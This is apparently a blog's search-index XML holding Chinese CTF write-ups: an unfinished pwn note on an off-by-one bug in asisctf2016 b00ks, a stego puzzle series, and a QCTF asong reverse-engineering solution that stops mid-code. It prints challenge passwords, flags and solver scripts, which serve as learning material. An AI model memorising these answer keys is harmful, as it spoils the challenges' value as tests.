<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>入门笔记3</title>
      <link href="/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B03/"/>
      <url>/%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B03/</url>
      <content type="html"><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>off-by-one指单字节缓冲区溢出，既程序在向缓冲区写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。off-by-one可以基于各种缓冲区，一般被认为比较难以利用，通常需要结合其他手段才能达到任意地址读写的目的。</p><h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><h3 id="asisctf2016-b00ks"><a href="#asisctf2016-b00ks" class="headerlink" title="asisctf2016 b00ks"></a>asisctf2016 b00ks</h3><p>这道题首先构造两个</p><p>通过读入Author_Name函数存在的null byte off-by-one漏洞，泄露存放第一个book_struct的地址，然后通过</p><ul><li>程序分析</li></ul><p>主函数如下（部分函数名和变量名经过修改），结合程序运行时的情况，这是一个图书管理系统，程序提供创建、删除、编辑、打印修改的功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">v3</span>;</span> <span class="comment">// rdi</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stdin</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_5586DAF91A77();</span><br><span class="line">  AuthorName();</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_5586DAF91A89() != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        Create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        Delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        Edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        Print(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        AuthorName();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v3 = (struct _IO_FILE *)<span class="string">"Wrong option"</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong option"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thanks to use our library software"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而程序中存在两个全局变量，一个是authorName，存放指向作者名地址的指针；另一个是booksTable，是一个存放指向book_struct的指针的指针数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000561205993010 booksTable dq offset unk_561205993060</span><br><span class="line">.data:0000561205993018 authorName dq offset unk_561205993040</span><br></pre></td></tr></table></figure><p>运行后查看这两个地址的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000561205993040  61 75 74 68 6F 72 4E 61  6D 65 00 00 00 00 00 00 ;authorName</span><br><span class="line">0000561205993050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span><br><span class="line">0000561205993060  50 B0 C4 06 12 56 00 00  00 00 00 00 00 00 00 00 ;addr book_struct</span><br><span class="line">0000561205993070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>然后要看一下book_struct的具体内容，在Create函数中有具体声明，其结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">void</span> * book_name;</span><br><span class="line">    <span class="keyword">void</span> * book_description;</span><br><span class="line">    <span class="keyword">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>* </p>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>国庆大礼包</title>
      <link href="/%E5%9B%BD%E5%BA%86%E5%A4%A7%E7%A4%BC%E5%8C%85/"/>
      <url>/%E5%9B%BD%E5%BA%86%E5%A4%A7%E7%A4%BC%E5%8C%85/</url>
      <content type="html"><![CDATA[<p>#国庆杂项大礼包</p><p>大佬国庆节前夕出的杂项题，给新人练手。</p><a id="more"></a><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>文件中有一个压缩包和一张图片，压缩包解压需要密码。</p><p>一种jpg图片隐写方法，由于0xffd9为jpg文件结束的标志，这之后的内容不会被读取。而且010editor也分析出了这一段unknownPadding，看上去像base64编码，最终解码得到下一关的解压密码。</p><img src="/国庆大礼包/1538737917309.png"><p>下一关解压密码</p><blockquote><p>ThIS1sTh3PasS</p></blockquote><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>文件依旧是一张图片和一个加密压缩包</p><p>右键看图片属性，发现备注里面有一段貌似密码的字符串，大写+数字，应该是base32位编码</p><img src="/国庆大礼包/1538738378707.png"><p>下一关解压密码</p><blockquote><p>happynationalda</p></blockquote><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>一个txt文件和一个加密压缩文件</p><p>txt文件对密码有提示，所以想到爆破，打开archpr</p><img src="/国庆大礼包/1538738804050.png"><p>得到爆破结果</p><img src="/国庆大礼包/1538738859641.png"><p>下一关解压密码</p><blockquote><p>005132</p></blockquote><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>一个png文件和一个加密压缩文件</p><p>用kali打开图片发现IHDR: CRC error，然后图片中的皮卡丘有点不完整，所以想到修改高度，但是修改为多少呢，我们通过crc的值爆破一下，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = open(<span class="string">"zhenhaowan.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0x4F5038A4</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>用010editor修改高度值为500，恢复图片，得到下一关的密码</p><img src="/国庆大礼包/1538741139056.png"><p>下一关解压密码</p><blockquote><p>Ohnextp1</p></blockquote><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>一个png文件、一个txt文件和一个加密压缩包</p><p>txt文件中给出了提示，根据提示用010editor提取每个IDAT节中插入的内容，要注意，插入的内容在crc值之前，如果按位置将crc值之后的值提取出来，虽然图片还原了，但crc值不对。</p><p>最终还原的图片如下</p><img src="/国庆大礼包/1538899382827.png"><p>下一关的解压密码</p><blockquote><p>366DD9140761E851C14088AD7C250FD93A98E0CB4BCDFAD474DAAC73CEC7DE9DE56A</p></blockquote><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>一个加密压缩包</p><p>没有其他提示信息，考虑伪加密，用010editor将deFlags的值从9修改为0，直接解压。</p><img src="/国庆大礼包/1538899717661.png"><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>一个flag.txt文件</p><p>里面的内容非常像css代码设置背景图时，后面跟着的url，复制到浏览器地址栏中并转到，就看到了flag</p><img src="/国庆大礼包/1538900024207.png"><p>最终的flag为</p><blockquote><p>flag{Go0D_g0OD_Study_day_DaY_9P}</p></blockquote>]]></content>
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>未分类题集</title>
      <link href="/%E6%9C%AA%E5%88%86%E7%B1%BB%E9%A2%98%E9%9B%86/"/>
      <url>/%E6%9C%AA%E5%88%86%E7%B1%BB%E9%A2%98%E9%9B%86/</url>
      <content type="html"><![CDATA[<p>题目清单</p><ul><li style="list-style: none"><input type="checkbox" checked> QCTF asong</li><li style="list-style: none"><input type="checkbox" checked> 网鼎杯 blend</li></ul><a id="more"></a><h2 id="QCTF-asong"><a href="#QCTF-asong" class="headerlink" title="QCTF asong"></a>QCTF asong</h2><p>这道题目逻辑理清楚之后其实很简单，所有的算法都是可逆的。比较坑的两点是sub_400D33函数很关键，但是IDA对它的反汇编一言难尽，要去看汇编；另外sub_400DB4函数其实是对数组的循环移位，一开始看真的没发现，后来看了官方writeup才反应过来，当然也有的大佬的writeup是爆破的，很强。逆向果然是一个考验耐心的工作。</p><ul><li><p>分析sub_400DB4函数    </p><p>对out中的数据做最后一步处理的关键代码</p><img src="/未分类题集/1536153004471.png" title="asong_1"><p>  一开始没发现，后来看了别人的writeup发现，是一个数组向左循环移动三位的功能的代码，于是写出解密函    数如下：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> arr[] = &#123; <span class="number">0xEC</span>,<span class="number">0x29</span>,<span class="number">0xE3</span>,<span class="number">0x41</span>,<span class="number">0xE1</span>,<span class="number">0xF7</span>,<span class="number">0xAA</span>,<span class="number">0x1D</span>,<span class="number">0x29</span>,<span class="number">0xED</span>,<span class="number">0x29</span>,<span class="number">0x99</span>,<span class="number">0x39</span>,<span class="number">0xF3</span>,<span class="number">0xB7</span>,<span class="number">0xA9</span>,<span class="number">0xE7</span>,<span class="number">0xAC</span>,<span class="number">0x2B</span>,<span class="number">0xB7</span>,<span class="number">0xAB</span>,<span class="number">0x40</span>,<span class="number">0x9F</span>,<span class="number">0xA9</span>,<span class="number">0x31</span>,<span class="number">0x35</span>,<span class="number">0x2C</span>,<span class="number">0x29</span>,<span class="number">0xEF</span>,<span class="number">0xA8</span>,<span class="number">0x3D</span>,<span class="number">0x4B</span>,<span class="number">0xB0</span>,<span class="number">0xE9</span>,<span class="number">0xE1</span>,<span class="number">0x68</span>,<span class="number">0x7B</span>,<span class="number">0x41</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = arr[len - <span class="number">1</span>] &lt;&lt; <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;<span class="number">0</span>; i--) &#123;</span><br><span class="line">arr[i] = arr[i] &gt;&gt; <span class="number">3</span> | arr[i - <span class="number">1</span>] &lt;&lt; <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line">arr[<span class="number">0</span>] = arr[<span class="number">0</span>] &gt;&gt; <span class="number">3</span> | temp;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x"</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3d,0x85,0x3c,0x68,0x3c,0x3e,0xf5,0x43,0xa5,0x3d,0xa5,0x33,0x27,0x3e,0x76,0xf5,0x3c,0xf5,0x85,0x76,0xf5,0x68,0x13,0xf5,0x26,0x26,0xa5,0x85,0x3d,0xf5,0x7,0xa9,0x76,0x1d,0x3c,0x2d,0xf,0x68</span><br></pre></td></tr></table></figure><ul><li><p>分析sub_400D33函数</p><p>再往前是sub_400D33函数对输出字符串的处理，F5之后是如下代码，</p><img src="/未分类题集/1536192887406.png" title="asong_2"><p>上述反编译代码存在一些问题，直接看汇编发现是如下一段置换代码，肯定是可逆的。    </p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_400D33(<span class="keyword">unsigned</span> <span class="keyword">char</span>* a)&#123;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>* b = dword_6020A0;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> c = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span>(b[t])&#123;</span><br><span class="line">        a[t] = a[b[t]];</span><br><span class="line">        t = b[t];</span><br><span class="line">    &#125;</span><br><span class="line">    a[t] = c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态调试得到其加密置换的顺序如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0-&gt;0x16-&gt;0x14-&gt;0x13-&gt;0xe-&gt;0x11-&gt;0x4-&gt;0x1e-&gt;0x1d-&gt;0x1c-&gt;0x1b-&gt;0x24-&gt;0x22-&gt;0x21-&gt;0x20-&gt;0x1f-&gt;0x25-&gt;0x23-&gt;0x1a-&gt;0x19-&gt;0x5-&gt;0x18-&gt;0xf-&gt;0x17-&gt;0x10-&gt;0xd-&gt;0xc-&gt;0x8-&gt;0x15-&gt;0xb-&gt;0xa-&gt;0x12-&gt;0x3-&gt;0x2-&gt;0x6-&gt;0x9-&gt;0x7-&gt;0x1-&gt;0</span><br></pre></td></tr></table></figure><p>编写解密置换代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b[] = &#123; <span class="number">0x16</span>,<span class="number">0x14</span>,<span class="number">0x13</span>,<span class="number">0xe</span>,<span class="number">0x11</span>,<span class="number">0x4</span>,<span class="number">0x1e</span>,<span class="number">0x1d</span>,<span class="number">0x1c</span>,<span class="number">0x1b</span>,<span class="number">0x24</span>,<span class="number">0x22</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="number">0x25</span>,<span class="number">0x23</span>,<span class="number">0x1a</span>,<span class="number">0x19</span>,<span class="number">0x5</span>,<span class="number">0x18</span>,<span class="number">0xf</span>,<span class="number">0x17</span>,<span class="number">0x10</span>,<span class="number">0xd</span>,<span class="number">0xc</span>,<span class="number">0x8</span>,<span class="number">0x15</span>,<span class="number">0xb</span>,<span class="number">0xa</span>,<span class="number">0x12</span>,<span class="number">0x3</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x9</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123; <span class="number">0x3d</span>,<span class="number">0x85</span>,<span class="number">0x3c</span>,<span class="number">0x68</span>,<span class="number">0x3c</span>,<span class="number">0x3e</span>,<span class="number">0xf5</span>,<span class="number">0x43</span>,<span class="number">0xa5</span>,<span class="number">0x3d</span>,<span class="number">0xa5</span>,<span class="number">0x33</span>,<span class="number">0x27</span>,<span class="number">0x3e</span>,<span class="number">0x76</span>,<span class="number">0xf5</span>,<span class="number">0x3c</span>,<span class="number">0xf5</span>,<span class="number">0x85</span>,<span class="number">0x76</span>,<span class="number">0xf5</span>,<span class="number">0x68</span>,<span class="number">0x13</span>,<span class="number">0xf5</span>,<span class="number">0x26</span>,<span class="number">0x26</span>,<span class="number">0xa5</span>,<span class="number">0x85</span>,<span class="number">0x3d</span>,<span class="number">0xf5</span>,<span class="number">0x7</span>,<span class="number">0xa9</span>,<span class="number">0x76</span>,<span class="number">0x1d</span>,<span class="number">0x3c</span>,<span class="number">0x2d</span>,<span class="number">0xf</span>,<span class="number">0x68</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> t = (<span class="keyword">sizeof</span>(b) / <span class="keyword">sizeof</span>(b[<span class="number">0</span>])) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> c = a[b[t]];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = t; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">a[b[i]] = a[b[i - <span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line">a[b[<span class="number">0</span>]] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= t; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x,"</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x85,0x43,0x68,0x85,0xf5,0x26,0x3c,0x3d,0x27,0xf5,0x33,0x68,0x3e,0x3c,0x76,0x26,0xf5,0x76,0xa5,0xf5,0x13,0xa5,0x85,0xf5,0x3e,0xa5,0x2d,0x3d,0xf5,0x7,0x3c,0x76,0x1d,0x3c,0xf,0x68,0x85,0xa9</span><br></pre></td></tr></table></figure><ul><li><p>分析sub_400E54函数</p><p>再往前看对输出字符串的处理，为如下函数中的for循环部分</p><img src="/未分类题集/1536194581220.png" title="asong_3"></li></ul><p>a1为输入字符串，我们进入sub_400936函数发现，是一段switch语句，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400936</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">35</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">44</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">46</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">58</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">59</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">21</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">63</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">27</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">95</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">49</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> ( a1 &lt;= <span class="number">47</span> || a1 &gt; <span class="number">57</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> )</span><br><span class="line">            result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">87</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">55</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写逆算法太麻烦，直接把这个函数复制下来，爆破。调试过程中发现每位符合条件的ascii码不确定，更具语义划定爆破范围。爆破代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__<span class="function">int64 <span class="title">sub_400936</span><span class="params">(<span class="keyword">char</span> a1)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> arr[] = &#123; <span class="number">0x85</span>,<span class="number">0x43</span>,<span class="number">0x68</span>,<span class="number">0x85</span>,<span class="number">0xf5</span>,<span class="number">0x26</span>,<span class="number">0x3c</span>,<span class="number">0x3d</span>,<span class="number">0x27</span>,<span class="number">0xf5</span>,<span class="number">0x33</span>,<span class="number">0x68</span>,<span class="number">0x3e</span>,<span class="number">0x3c</span>,<span class="number">0x76</span>,<span class="number">0x26</span>,<span class="number">0xf5</span>,<span class="number">0x76</span>,<span class="number">0xa5</span>,<span class="number">0xf5</span>,<span class="number">0x13</span>,<span 